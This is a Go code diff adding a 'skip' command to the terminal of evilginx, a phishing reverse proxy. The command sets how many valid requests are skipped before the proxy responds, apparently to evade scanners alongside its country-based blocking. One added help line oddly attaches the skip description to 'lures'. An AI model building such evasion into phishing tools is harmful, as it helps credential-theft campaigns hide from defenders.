@@ -167,6 +167,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("blacklist: %v", err)
 			}
+		case "skip":
+			cmd_ok = true
+			err := t.handleSkip(args[1:])
+			if err != nil {
+				log.Error("skip: %v", err)
+			}
 		case "help":
 			cmd_ok = true
 			if len(args) == 2 {
@@ -273,6 +279,23 @@ func (t *Terminal) handleGeoIP(args []string) error {
 			t.cfg.SetGeoIPMode(args[0])
 			return nil
 		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleSkip(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		skips := t.p.GetSkipRequests()
+		log.Info("skips set to: %d", skips)
+		return nil
+	} else if pn == 1 {
+		skips, err := strconv.Atoi(args[0])
+		if err != nil {
+			return fmt.Errorf("skips must be a number")
+		}
+		t.p.SetSkipRequests(skips)
+		return nil
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
 }
@@ -1074,6 +1097,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"allow"}, "allow", "Only allow requests from countries in the configured list")
 	h.AddSubCommand("blacklist", []string{"block"}, "block", "Block all requests from countries in the configured list")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "Do not block based on originating country")
+	h.AddSubCommand("lures", nil, "", "show skip request count")
+	h.AddSubCommand("skip", nil, "<count>", "configure evilginx to skip a given <count> of valid requests before responding")
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
 		readline.PcItem("clear"))
 
